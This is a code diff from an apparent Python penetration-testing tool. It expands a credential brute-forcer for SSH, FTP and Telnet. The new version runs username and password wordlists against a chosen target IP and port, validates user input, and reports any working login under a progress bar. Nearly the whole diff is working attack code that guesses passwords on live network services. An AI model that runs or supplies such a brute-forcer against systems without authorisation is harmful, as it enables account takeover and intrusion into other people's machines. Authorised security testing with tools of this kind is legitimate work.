@@ -92,28 +92,39 @@ def main():
             input(Fore.YELLOW + "\n[+] Press Enter to return to main menu..."+ Style.RESET_ALL )
 
         elif choice == '3':
-            service = input("Select Service SSH,FTP,Telnet: ").lower()
-            target = input("Target IP: ")
-            username = input("Username: ")
-            wordlist = input("Wordlist path: ")
-
             bruteforcer = BruteForcer()
-            if service == 'ssh':
-                result = bruteforcer.ssh_bruteforce(target, username, wordlist)
-            elif service == 'ftp':
-                result = bruteforcer.ftp_bruteforce(target, username, wordlist)
-            elif service == 'telnet':
-                result = bruteforcer.telnet_bruteforce(target, username, wordlist)
+            
+            service = bruteforcer._get_input("Select Service (SSH, FTP, Telnet): ", bruteforcer._validate_service)
+            target = bruteforcer._get_input("Target IP: ")
+            port = bruteforcer._get_port(service)
+            use_dual_wordlist = bruteforcer._get_yes_no("Use separate wordlists for username and password? (y/n): ")
+
+            if use_dual_wordlist:
+                username_wordlist = bruteforcer._get_wordlist("Username wordlist path: ")
+                password_wordlist = bruteforcer._get_wordlist("Password wordlist path: ")
             else:
-                print("Invalid service")
-                continue  
+                username = bruteforcer._get_input("Username: ")
+                password_wordlist = bruteforcer._get_wordlist("Password wordlist path: ")
+
+            if service == 'ssh':
+                result = bruteforcer.ssh_bruteforce(target, 
+                    username if not use_dual_wordlist else username_wordlist, 
+                    password_wordlist, port)
+            elif service == 'ftp':
+                result = bruteforcer.ftp_bruteforce(target, 
+                    username if not use_dual_wordlist else username_wordlist, 
+                    password_wordlist, port)
+            elif service == 'telnet':
+                result = bruteforcer.telnet_bruteforce(target, 
+                    username if not use_dual_wordlist else username_wordlist, 
+                    password_wordlist, port)
 
             if result:
-                print(f"Successful login: {result[0]}:{result[1]}")
+                print(Fore.GREEN + f"[+] Successful login: {result[0]}:{result[1]}" + Style.RESET_ALL)
             else:
-                print("Bruteforce failed")
-            
-            input(Fore.YELLOW + "\n[+] Press Enter to return to main menu..."+ Style.RESET_ALL )
+                print(Fore.RED + "[!] Bruteforce failed." + Style.RESET_ALL)
+
+            input(Fore.YELLOW + "\n[+] Press Enter to return to main menu..." + Style.RESET_ALL)
 
         elif choice == '4':
             while True:
@@ -603,55 +614,249 @@ class VulnerabilityScanner:
 
 #Service BruteForcer 
 class BruteForcer:
-    def ssh_bruteforce(self, target, username, wordlist, port=22, timeout=5):
-        with open(wordlist, 'r') as f:
-            for password in f:
-                password = password.strip()
-                try:
-                    ssh = paramiko.SSHClient()
-                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                    ssh.connect(target, port=port, username=username, password=password, timeout=timeout)
-                    print(Fore.GREEN + f"[!] SSH Success: {username}:{password}" + Style.RESET_ALL)
-                    ssh.close()
-                    return (username, password)
-                except:
-                    continue
-        return None
+    def __init__(self):
+        self.reset_state()
 
-    def ftp_bruteforce(self, target, username, wordlist, port=21, timeout=5):
-        with open(wordlist, 'r') as f:
-            for password in f:
-                password = password.strip()
-                try:
-                    ftp = ftplib.FTP()
-                    ftp.connect(target, port, timeout=timeout)
-                    ftp.login(username, password)
-                    print(f"[+] FTP Success: {username}:{password}")
-                    ftp.quit()
-                    return (username, password)
-                except:
-                    continue
-        return None
+    def reset_state(self):
+        self.lock = threading.Lock()
+        self.progress = 0
+        self.total_tasks = 0
+        self.scan_complete = False
 
-    def telnet_bruteforce(self, target, username, wordlist, port=23, timeout=5):
-        with open(wordlist, 'r') as f:
-            for password in f:
-                password = password.strip()
-                try:
-                    tn = telnetlib.Telnet(target, port=port, timeout=timeout)
-                    tn.read_until(b"login: ")
-                    tn.write(username.encode('ascii') + b"\n")
-                    tn.read_until(b"Password: ")
-                    tn.write(password.encode('ascii') + b"\n")
-                    result = tn.expect([b"Login incorrect", b"Last login"], timeout=timeout)
-                    if result[0] == 1:
-                        print(f"[+] Telnet Success: {username}:{password}")
-                        tn.close()
-                        return (username, password)
-                    tn.close()
-                except:
+    def _update_progress(self):
+        bar_format = (
+            f"{Fore.CYAN}{{desc}}: {{percentage:3.0f}}%|"
+            f"{Fore.BLUE}{{bar}}{Style.RESET_ALL}| "
+            f"{Fore.CYAN}{{n_fmt}}/{{total_fmt}} [{{elapsed}}<{{remaining}}, {{rate_fmt}}]{Style.RESET_ALL}"
+        )
+
+        with tqdm(
+            total=self.total_tasks,
+            desc=f"{Fore.CYAN}Brute Force Progress{Style.RESET_ALL}",
+            bar_format=bar_format,
+            position=0,
+            leave=False,
+            ascii=" █",
+            dynamic_ncols=True
+        ) as pbar:
+            while self.progress < self.total_tasks and not self.scan_complete:
+                pbar.n = self.progress
+                pbar.refresh()
+                time.sleep(0.1)
+            pbar.close()
+
+    def _validate_service(self, service):
+        valid_services = ['ssh', 'ftp', 'telnet']
+        if service.lower() not in valid_services:
+            print(Fore.RED + "[!] Invalid service. Please choose SSH, FTP, or Telnet." + Style.RESET_ALL)
+            return False
+        return True
+
+    def _get_yes_no(self, prompt):
+        while True:
+            response = input(prompt).strip().lower()
+            if response in ('y', 'n'):
+                return response == 'y'
+            print(Fore.RED + "[!] Invalid choice. Please enter Y or N." + Style.RESET_ALL)
+
+    def _get_input(self, prompt, validation_func=None):
+        while True:
+            user_input = input(prompt).strip()
+            if not user_input:
+                print(Fore.RED + "[!] Input cannot be empty. Please provide a valid value." + Style.RESET_ALL)
+                continue
+            if validation_func and not validation_func(user_input):
+                continue
+            return user_input
+
+    def _get_wordlist(self, prompt):
+        while True:
+            path = self._get_input(prompt)
+            if not os.path.isfile(path):
+                print(Fore.RED + "[!] File not found." + Style.RESET_ALL)
+                continue
+            with open(path, 'r') as f:
+                if len(f.readlines()) == 0:
+                    print(Fore.RED + "[!] Wordlist is empty." + Style.RESET_ALL)
                     continue
-        return None
+            return path
+
+    def _get_port(self, service):
+        default_port = 22 if service == 'ssh' else 21 if service == 'ftp' else 23
+        while True:
+            port_input = input(f"Port (default {default_port}): ").strip()
+            if not port_input:
+                return default_port
+            if port_input.isdigit() and 1 <= int(port_input) <= 65535:
+                return int(port_input)
+            print(Fore.RED + "[!] Invalid port. Please enter a number between 1 and 65535." + Style.RESET_ALL)
+
+    def ssh_bruteforce(self, target, username_or_wordlist, password_wordlist, port=22, timeout=5):
+        progress_thread = None
+        try:
+            if os.path.isfile(username_or_wordlist):
+                with open(username_or_wordlist, 'r') as user_file, open(password_wordlist, 'r') as pass_file:
+                    usernames = [line.strip() for line in user_file]
+                    passwords = [line.strip() for line in pass_file]
+                    self.total_tasks = len(usernames) * len(passwords)
+                    progress_thread = threading.Thread(target=self._update_progress, daemon=True)
+                    progress_thread.start()
+
+                    for username in usernames:
+                        for password in passwords:
+                            try:
+                                ssh = paramiko.SSHClient()
+                                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                                ssh.connect(target, port=port, username=username, password=password, timeout=timeout)
+                                tqdm.write(Fore.GREEN + f"\n[!] SSH Success: {username}:{password}" + Style.RESET_ALL)
+                                ssh.close()
+                                self.scan_complete = True
+                                return (username, password)
+                            except:
+                                with self.lock:
+                                    self.progress += 1
+                                continue
+            else:
+                username = username_or_wordlist
+                with open(password_wordlist, 'r') as f:
+                    passwords = [line.strip() for line in f]
+                    self.total_tasks = len(passwords)
+                    progress_thread = threading.Thread(target=self._update_progress, daemon=True)
+                    progress_thread.start()
+
+                    for password in passwords:
+                        try:
+                            ssh = paramiko.SSHClient()
+                            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                            ssh.connect(target, port=port, username=username, password=password, timeout=timeout)
+                            tqdm.write(Fore.GREEN + f"\n[!] SSH Success: {username}:{password}" + Style.RESET_ALL)
+                            ssh.close()
+                            self.scan_complete = True
+                            return (username, password)
+                        except:
+                            with self.lock:
+                                self.progress += 1
+                            continue
+        finally:
+            self.scan_complete = True
+            if progress_thread and progress_thread.is_alive():
+                progress_thread.join(timeout=1)
+            print("\033[2K\r", end="")  # Clear progress bar line
+
+    def ftp_bruteforce(self, target, username_or_wordlist, password_wordlist, port=21, timeout=5):
+        progress_thread = None
+        try:
+            if os.path.isfile(username_or_wordlist):
+                with open(username_or_wordlist, 'r') as user_file, open(password_wordlist, 'r') as pass_file:
+                    usernames = [line.strip() for line in user_file]
+                    passwords = [line.strip() for line in pass_file]
+                    self.total_tasks = len(usernames) * len(passwords)
+                    progress_thread = threading.Thread(target=self._update_progress, daemon=True)
+                    progress_thread.start()
+
+                    for username in usernames:
+                        for password in passwords:
+                            try:
+                                ftp = ftplib.FTP()
+                                ftp.connect(target, port, timeout=timeout)
+                                ftp.login(username, password)
+                                tqdm.write(f"\n[+] FTP Success: {username}:{password}")
+                                ftp.quit()
+                                self.scan_complete = True
+                                return (username, password)
+                            except:
+                                with self.lock:
+                                    self.progress += 1
+                                continue
+            else:
+                username = username_or_wordlist
+                with open(password_wordlist, 'r') as f:
+                    passwords = [line.strip() for line in f]
+                    self.total_tasks = len(passwords)
+                    progress_thread = threading.Thread(target=self._update_progress, daemon=True)
+                    progress_thread.start()
+
+                    for password in passwords:
+                        try:
+                            ftp = ftplib.FTP()
+                            ftp.connect(target, port, timeout=timeout)
+                            ftp.login(username, password)
+                            tqdm.write(f"\n[+] FTP Success: {username}:{password}")
+                            ftp.quit()
+                            self.scan_complete = True
+                            return (username, password)
+                        except:
+                            with self.lock:
+                                self.progress += 1
+                            continue
+        finally:
+            self.scan_complete = True
+            if progress_thread and progress_thread.is_alive():
+                progress_thread.join(timeout=1)
+            print("\033[2K\r", end="")  # Clear progress bar line
+
+    def telnet_bruteforce(self, target, username_or_wordlist, password_wordlist, port=23, timeout=5):
+        progress_thread = None
+        try:
+            if os.path.isfile(username_or_wordlist):
+                with open(username_or_wordlist, 'r') as user_file, open(password_wordlist, 'r') as pass_file:
+                    usernames = [line.strip() for line in user_file]
+                    passwords = [line.strip() for line in pass_file]
+                    self.total_tasks = len(usernames) * len(passwords)
+                    progress_thread = threading.Thread(target=self._update_progress, daemon=True)
+                    progress_thread.start()
+
+                    for username in usernames:
+                        for password in passwords:
+                            try:
+                                tn = telnetlib.Telnet(target, port=port, timeout=timeout)
+                                tn.read_until(b"login: ")
+                                tn.write(username.encode('ascii') + b"\n")
+                                tn.read_until(b"Password: ")
+                                tn.write(password.encode('ascii') + b"\n")
+                                result = tn.expect([b"Login incorrect", b"Last login"], timeout=timeout)
+                                if result[0] == 1:
+                                    tqdm.write(f"\n[+] Telnet Success: {username}:{password}")
+                                    tn.close()
+                                    self.scan_complete = True
+                                    return (username, password)
+                                tn.close()
+                            except:
+                                with self.lock:
+                                    self.progress += 1
+                                continue
+            else:
+                username = username_or_wordlist
+                with open(password_wordlist, 'r') as f:
+                    passwords = [line.strip() for line in f]
+                    self.total_tasks = len(passwords)
+                    progress_thread = threading.Thread(target=self._update_progress, daemon=True)
+                    progress_thread.start()
+
+                    for password in passwords:
+                        try:
+                            tn = telnetlib.Telnet(target, port=port, timeout=timeout)
+                            tn.read_until(b"login: ")
+                            tn.write(username.encode('ascii') + b"\n")
+                            tn.read_until(b"Password: ")
+                            tn.write(password.encode('ascii') + b"\n")
+                            result = tn.expect([b"Login incorrect", b"Last login"], timeout=timeout)
+                            if result[0] == 1:
+                                tqdm.write(f"\n[+] Telnet Success: {username}:{password}")
+                                tn.close()
+                                self.scan_complete = True
+                                return (username, password)
+                            tn.close()
+                        except:
+                            with self.lock:
+                                self.progress += 1
+                            continue
+        finally:
+            self.scan_complete = True
+            if progress_thread and progress_thread.is_alive():
+                progress_thread.join(timeout=1)
+            print("\033[2K\r", end="")  
+  
 
 # WAF Scanner 
 class WafScanner:
